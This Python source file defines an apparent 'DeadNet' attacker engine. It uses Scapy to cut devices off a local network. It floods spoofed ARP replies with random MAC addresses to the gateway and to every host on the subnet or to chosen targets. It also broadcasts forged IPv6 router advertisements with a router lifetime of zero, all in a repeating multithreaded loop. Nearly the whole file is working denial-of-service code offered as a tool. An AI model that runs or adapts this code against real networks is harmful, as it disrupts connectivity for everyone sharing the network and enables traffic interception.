from __future__ import annotations

import random
import re
import threading
import time
import traceback
from concurrent.futures import ThreadPoolExecutor
from typing import Any

from app.infra.network import generate_host_ips, get_gateway_ipv4, get_gateway_mac
from app.infra.scapy_adapter import load_scapy

IPV6_MULTIC_ADDR = "ff02::1"
IPV6_LL_PREF = "fe80"
IPV6_PREFLEN = 64


def _mac_to_ipv6_link_local(mac: str, prefix: str) -> str:
    value = hex(int(re.sub(r"[^0-9A-Fa-f]", "", mac), 16) ^ 0x020000000000)[2:]
    return f"{prefix}::{value[:4]}:{value[4:6]}ff:fe{value[6:8]}:{value[8:12]}"


class DeadNetAttackerEngine:
    def __init__(
        self,
        iface: str,
        cidrlen: int,
        interval: int,
        disable_ipv6: bool,
        mode: str,
        fake_ip: str | None,
        target_ips: list[str] | None,
        attacks_enabled: dict[str, bool],
        log_fn,
        stats_fn,
    ) -> None:
        self.scapy = load_scapy().mod
        self.network_interface = iface
        self.arp_poison_interval = interval
        self.cidrlen_ipv4 = cidrlen
        self.spoof_ipv6ra = not disable_ipv6
        self.mode = mode
        self.fake_ip = fake_ip
        self.target_ips = target_ips or []
        self.attacks_enabled = attacks_enabled
        self.log = log_fn
        self.update_stats = stats_fn

        self.scapy.conf.iface = self.network_interface
        self.user_ipv4 = self.scapy.get_if_addr(self.network_interface)
        self.subnet_ipv4 = self.user_ipv4.split(".")[:3]
        self.subnet_ipv4_sr = f"{'.'.join(self.subnet_ipv4)}.0/{self.cidrlen_ipv4}"
        self.gateway_ipv4 = get_gateway_ipv4(self.network_interface)
        if not self.gateway_ipv4:
            raise RuntimeError("Unable to detect gateway IPv4 address")
        self.gateway_mac = get_gateway_mac(self.gateway_ipv4, self.network_interface)
        if not self.gateway_mac:
            raise RuntimeError("Unable to retrieve gateway MAC address")

        self.gateway_ipv6 = _mac_to_ipv6_link_local(self.gateway_mac, IPV6_LL_PREF)
        self.mac_cache: dict[str, str] = {}
        self.targeted_mode = bool(self.target_ips)
        if self.targeted_mode:
            self.host_ipv4s = [ip.strip() for ip in self.target_ips if ip.strip()]
        else:
            self.host_ipv4s = generate_host_ips(self.subnet_ipv4_sr, [self.user_ipv4, self.gateway_ipv4])

    def network_info(self) -> dict[str, Any]:
        return {
            "interface": self.network_interface,
            "ip": self.user_ipv4,
            "gateway": self.gateway_ipv4,
            "gateway_mac": self.gateway_mac,
            "subnet": self.subnet_ipv4_sr,
            "target_hosts": len(self.host_ipv4s),
        }

    def _random_ip(self) -> str:
        return f"{'.'.join(self.subnet_ipv4)}.{random.randint(2, 250)}"

    def _poison_single_host(self, host_ip: str) -> int:
        try:
            spoof_mac = self.scapy.RandMAC()
            source_ip = self.fake_ip or self._random_ip()
            if self.targeted_mode:
                target_mac = self.mac_cache.get(host_ip)
                if not target_mac:
                    target_mac = self.scapy.getmacbyip(host_ip)
                    if target_mac:
                        self.mac_cache[host_ip] = target_mac
                if not target_mac:
                    return 0

                to_gateway = self.scapy.ARP(op=2, psrc=host_ip, hwsrc=spoof_mac, pdst=self.gateway_ipv4, hwdst=self.gateway_mac)
                self.scapy.sendp(self.scapy.Ether(dst=self.gateway_mac) / to_gateway, iface=self.network_interface, verbose=0)
                to_target = self.scapy.ARP(op=2, psrc=self.gateway_ipv4, hwsrc=spoof_mac, pdst=host_ip, hwdst=target_mac)
                self.scapy.sendp(self.scapy.Ether(dst=target_mac) / to_target, iface=self.network_interface, verbose=0)
            else:
                broadcast = self.scapy.ARP(
                    op=2,
                    psrc=source_ip,
                    hwsrc=spoof_mac,
                    pdst=self.gateway_ipv4,
                    hwdst="ff:ff:ff:ff:ff:ff",
                )
                self.scapy.sendp(
                    self.scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / broadcast,
                    iface=self.network_interface,
                    verbose=0,
                )
                to_gateway = self.scapy.ARP(op=2, psrc=host_ip, hwsrc=spoof_mac, pdst=self.gateway_ipv4, hwdst=self.gateway_mac)
                self.scapy.sendp(self.scapy.Ether(dst=self.gateway_mac) / to_gateway, iface=self.network_interface, verbose=0)
            return 2
        except Exception:
            return 0

    def poison_arp(self) -> int:
        if not self.attacks_enabled.get("arp_poison", True):
            return 0
        workers = 10 if self.targeted_mode else 50
        with ThreadPoolExecutor(max_workers=workers) as executor:
            return sum(executor.map(self._poison_single_host, self.host_ipv4s))

    def poison_ra(self) -> int:
        if not self.attacks_enabled.get("ipv6_ra", True):
            return 0
        try:
            rand_mac = self.scapy.RandMAC()
            packet = (
                self.scapy.Ether(src=rand_mac)
                / self.scapy.IPv6(src=self.gateway_ipv6, dst=IPV6_MULTIC_ADDR)
                / self.scapy.ICMPv6ND_RA(chlim=255, routerlifetime=0, reachabletime=0)
                / self.scapy.ICMPv6NDOptSrcLLAddr(lladdr=rand_mac)
                / self.scapy.ICMPv6NDOptMTU()
                / self.scapy.ICMPv6NDOptPrefixInfo(prefixlen=IPV6_PREFLEN, prefix=f"{IPV6_LL_PREF}::")
            )
            self.scapy.sendp(packet, iface=self.network_interface, verbose=0)
            return 1
        except Exception:
            return 0

    def dead_router_attack(self, stop_event: threading.Event) -> None:
        if not self.attacks_enabled.get("dead_router", True):
            return
        while not stop_event.is_set():
            time.sleep(0.25)

    def run(self, stop_event: threading.Event) -> None:
        self.update_stats(start_time=time.time())
        if self.spoof_ipv6ra and self.attacks_enabled.get("dead_router", True):
            threading.Thread(target=self.dead_router_attack, args=(stop_event,), daemon=True).start()

        while not stop_event.is_set():
            cycle_start = int(time.time() * 1000)
            packets_sent = 0
            try:
                with ThreadPoolExecutor(max_workers=3) as executor:
                    futures = [executor.submit(self.poison_arp)]
                    if self.spoof_ipv6ra:
                        futures.append(executor.submit(self.poison_ra))
                    for future in futures:
                        packets_sent += int(future.result(timeout=30) or 0)

                duration = int(time.time() * 1000) - cycle_start
                self.update_stats(cycle_increment=1, packets_increment=packets_sent, last_cycle_duration=duration)
                self.log(f"Cycle complete - packets={packets_sent} duration={duration}ms")
                stop_event.wait(self.arp_poison_interval)
            except Exception as exc:
                self.log(f"Attack error: {exc}")
                self.log(traceback.format_exc())
                break
